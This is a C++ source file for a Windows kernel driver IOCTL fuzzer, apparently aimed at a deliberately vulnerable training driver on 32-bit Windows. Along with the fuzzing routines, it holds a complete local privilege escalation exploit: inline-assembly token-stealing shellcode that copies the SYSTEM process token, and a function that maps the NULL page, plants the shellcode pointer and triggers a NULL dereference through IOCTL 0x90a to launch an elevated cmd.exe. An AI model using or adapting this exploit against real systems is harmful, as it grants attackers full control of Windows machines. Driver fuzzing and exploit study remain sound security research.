#include "driver_fuzzer.h"

#include <string>
#include <vector>
#include <fstream>
#include <sstream>
#include <iomanip>
#include <unordered_set>

#include <windows.h>

#define KTHREAD_OFFSET    0x124    // nt!_KPCR.PcrbData.CurrentThread
#define EPROCESS_OFFSET   0x050    // nt!_KTHREAD.ApcState.Process
#define PID_OFFSET        0x0B4    // nt!_EPROCESS.UniqueProcessId
#define FLINK_OFFSET      0x0B8    // nt!_EPROCESS.ActiveProcessLinks.Flink
#define TOKEN_OFFSET      0x0F8    // nt!_EPROCESS.Token
#define SYSTEM_PID        0x004    // SYSTEM Process PID

namespace MyProgam {
  void TokenStealingShellcode() {
    __asm {
      pushad

      xor eax, eax
      mov eax, fs:[eax + KTHREAD_OFFSET]
      mov eax, [eax + EPROCESS_OFFSET]

      mov ecx, eax

      mov ebx, [eax + TOKEN_OFFSET]
      mov edx, SYSTEM_PID

      SearchSystemPID:
        mov eax, [eax + FLINK_OFFSET]
        sub eax, FLINK_OFFSET
        cmp [eax + PID_OFFSET], edx
        jne SearchSystemPID

        mov edx, [eax + TOKEN_OFFSET]
        mov [ecx + TOKEN_OFFSET], edx
        popad
    }
  }
}

MyProgram::DriverFuzzer::
DriverFuzzer(std::string sDriverName) {
  m_hDriver = CreateFileA(
    sDriverName.data(),
    GENERIC_READ | GENERIC_WRITE,
    0,
    NULL,
    OPEN_EXISTING,
    FILE_ATTRIBUTE_SYSTEM,
    NULL
  );

  if (m_hDriver == INVALID_HANDLE_VALUE) {
    _LogErrorCode("CreateFileA failed", GetLastError());
  }
}

MyProgram::DriverFuzzer::
~DriverFuzzer() { if (IsOpen()) { CloseHandle(m_hDriver); } }

BOOL
MyProgram::DriverFuzzer::
IsOpen() const { return m_hDriver != INVALID_HANDLE_VALUE; }

BOOL
MyProgram::DriverFuzzer::
AutoFuzzIOCTLs() {
  DWORD dwBuffer = 0;
  DWORD dwFunctionMax = 1 << 13; // Function ID takes 12 bits in CTL_CODE
  std::unordered_set<DWORD> usSkippable = { ERROR_INVALID_FUNCTION };
  const std::vector<DWORD> methods = {
    METHOD_BUFFERED, METHOD_IN_DIRECT, METHOD_OUT_DIRECT, METHOD_NEITHER
  };

  const std::vector<DWORD> accesses = {
    FILE_ANY_ACCESS, FILE_READ_ACCESS, FILE_WRITE_ACCESS
  };

  if (!IsOpen()) { return FALSE; }

  for (DWORD dwFunction = 0; dwFunction < dwFunctionMax; ++dwFunction) {
    for (const auto& dwMethod : methods) {
      for (const auto& dwAccess : accesses) {
        _CheckIOCTL(
          FILE_DEVICE_UNKNOWN, dwFunction, dwMethod, dwAccess,
          &dwBuffer, sizeof(dwBuffer), NULL, 0, usSkippable
        );
      }
    }
  }

  return TRUE;
}

BOOL
MyProgram::DriverFuzzer::
AutoFuzzIOCTLBuffer(
    DWORD dwDeviceType,
    DWORD dwFunction,
    DWORD dwMethod,
    DWORD dwAccess
) {
  DWORD dwBuffer = 0;

  DWORD dwMaxToMid = 0xffffffff;
  DWORD dwMidToMax = 0xbad00000;
  DWORD dwMidToMin = 0x7fffffff;
  DWORD dwMinToMid = 0x00000000;
  std::unordered_set<DWORD> usSkippable = {
    ERROR_INVALID_FUNCTION, ERROR_NOACCESS
  };

  if (!IsOpen()) { return FALSE; }

  while (dwMaxToMid > dwMidToMax && dwMidToMin > dwMinToMid) {
    dwBuffer = dwMaxToMid;
    _CheckIOCTL(
      dwDeviceType, dwFunction, dwMethod, dwAccess,
      &dwBuffer, sizeof(dwBuffer), NULL, 0, usSkippable
    );

    --dwMaxToMid;

    if (dwMaxToMid > dwMidToMax) { 
      dwBuffer = dwMidToMax;
      _CheckIOCTL(
        dwDeviceType, dwFunction, dwMethod, dwAccess,
        &dwBuffer, sizeof(dwBuffer), NULL, 0, usSkippable
      );

      ++dwMidToMax;
    }
  
    dwBuffer = dwMidToMin;
    _CheckIOCTL(
      dwDeviceType, dwFunction, dwMethod, dwAccess,
      &dwBuffer, sizeof(dwBuffer), NULL, 0, usSkippable
    );

    --dwMidToMin;

    if (dwMidToMin > dwMinToMid) {
      dwBuffer = dwMinToMid;
      _CheckIOCTL(
        dwDeviceType, dwFunction, dwMethod, dwAccess,
        &dwBuffer, sizeof(dwBuffer), NULL, 0, usSkippable
      );

      ++dwMinToMid;
    }
  }

  return TRUE;
}

VOID
MyProgram::DriverFuzzer::
ExploitVulnerability() {
  using PNtAllocateVirtualMemory = NTSTATUS(WINAPI*)(
    HANDLE ProcessHandle,
    PVOID* BaseAddress,
    ULONG ZeroBits,
    PULONG AllocationSize,
    ULONG AllocationType,
    ULONG Protect
  );
  HMODULE hNtDll = NULL;

  PNtAllocateVirtualMemory pNtAllocateVirtualMemory = NULL;
  // Cannot pass NULL directly, but it will be rounded to 0;
  PVOID pBaseAddress = PVOID(0x01);
  PULONG pNullPtrDereference = PULONG(ULONG(0x04));
  // This value will be rounded to page size
  ULONG ulRegionSize = 0xff;
  std::stringstream sErrMsg;
  DWORD dwBuffer = 0x00;

  hNtDll = GetModuleHandleA("ntdll.dll");
  if (!hNtDll) {
    _LogErrorCode("GetModuleHandleA failed", GetLastError());
    return;
  }

  pNtAllocateVirtualMemory = reinterpret_cast<PNtAllocateVirtualMemory>(
    GetProcAddress(hNtDll, "NtAllocateVirtualMemory")
  );
  if (!pNtAllocateVirtualMemory) {
    // No need to dispose hNtDll
    _LogErrorCode("Resolving NtAllocateVirtualMemory failed", GetLastError());
    return;
  }

  // Map to NULL page
  NTSTATUS ntStatus = pNtAllocateVirtualMemory(
    GetCurrentProcess(),
    &pBaseAddress,
    NULL,
    &ulRegionSize,
    // Reserve and commit in one step,
    // allocate memory at the highest possible address
    MEM_RESERVE | MEM_COMMIT | MEM_TOP_DOWN,
    PAGE_EXECUTE_READWRITE
  );

  if (ntStatus != ERROR_SUCCESS) {
    _LogErrorCode("NtAllocateVirtualMemory failed", ntStatus);
    return;
  }

  auto cPrevFill = std::cout.fill('0');
  std::cout << std::hex
    << "Memory allocated at: 0x" << std::setw(8) << pBaseAddress << '\n'
    << "Allocated memory size: 0x" << std::setw(8) << ulRegionSize << '\n';

  std::cout.fill(cPrevFill);

  *pNullPtrDereference = ULONG(&MyProgam::TokenStealingShellcode);
  
  _CheckIOCTL(
    FILE_DEVICE_UNKNOWN, 0x90a, METHOD_NEITHER, FILE_ANY_ACCESS,
    &dwBuffer, sizeof(dwBuffer), NULL, 0, {}
  );

  system("cmd.exe");
  std::cout << "Exploit completed\n";
}

VOID
MyProgram::DriverFuzzer::
_CheckIOCTL(
  DWORD dwDeviceType,
  DWORD dwFunction,
  DWORD dwMethod,
  DWORD dwAccess,
  LPVOID lpInputBuffer,
  DWORD dwInputBufferSize,
  LPVOID lpOutputBuffer,
  DWORD dwOutputBufferSize,
  const std::unordered_set<DWORD>& usSkippableErrors
) {
  BOOL bRes = FALSE;
  DWORD cbRet = 0;

  bRes = DeviceIoControl(
    m_hDriver,
    CTL_CODE(dwDeviceType, dwFunction, dwMethod, dwAccess),
    lpInputBuffer, dwInputBufferSize, lpOutputBuffer, dwOutputBufferSize,
    &cbRet, 0
  );

  std::stringstream sErrMsg;
  sErrMsg.fill('0');
  sErrMsg << "Sending "
    << _GetCTLCODEMessage(dwDeviceType, dwFunction, dwMethod, dwAccess)
    << " with buffer value 0x" << std::setw(8) << std::hex
    << *(LPDWORD)lpInputBuffer;
  
  if (!bRes) {
    if (!usSkippableErrors.count(GetLastError())) {
      sErrMsg << " failed";
      _LogErrorCode(sErrMsg.str(), GetLastError());
    }
  } else {
    sErrMsg << " succeeded";
    _Log(sErrMsg.str());
  }
}

VOID
MyProgram::DriverFuzzer::
_LogErrorCode(std::string sErrorMsg, DWORD dwErrorCode) const {
  std::stringstream ssMsg;

  ssMsg.fill('0');

  ssMsg << sErrorMsg
    << " ERROR_CODE: 0x" << std::setw(8) << std::hex << dwErrorCode;

  _Log(ssMsg.str(), LOG_STATUS::LOG_ERR);
}

VOID
MyProgram::DriverFuzzer::
_Log(std::string sMsg, LOG_STATUS dwStatus) const {
  std::ofstream fdLog("driver_fuzzer.log", std::ios_base::app);
  std::string sStatus;

  if (fdLog.is_open()) {
    switch (dwStatus) {
      case LOG_STATUS::LOG_INFO:
        sStatus = "INFO: ";
        break;
      case LOG_STATUS::LOG_ERR:
        sStatus = "ERROR: ";
        break;
    }

    fdLog << sStatus << sMsg << '\n';

    fdLog.close();
  }
}

const std::string
MyProgram::DriverFuzzer::
_GetCTLCODEMessage(
  DWORD dwDeviceType,
  DWORD dwFunction,
  DWORD dwMethod,
  DWORD dwAccess
) const {
  std::stringstream sStr;

  sStr.fill('0');

  sStr << "CTL_CODE(0x" << std::hex
    << std::setw(2) << dwDeviceType << ", 0x"
    << std::setw(4) << dwFunction << ", 0x"
    << std::setw(2) << dwMethod << ", 0x" 
    << std::setw(2) << dwAccess << ")";

  return sStr.str();
}
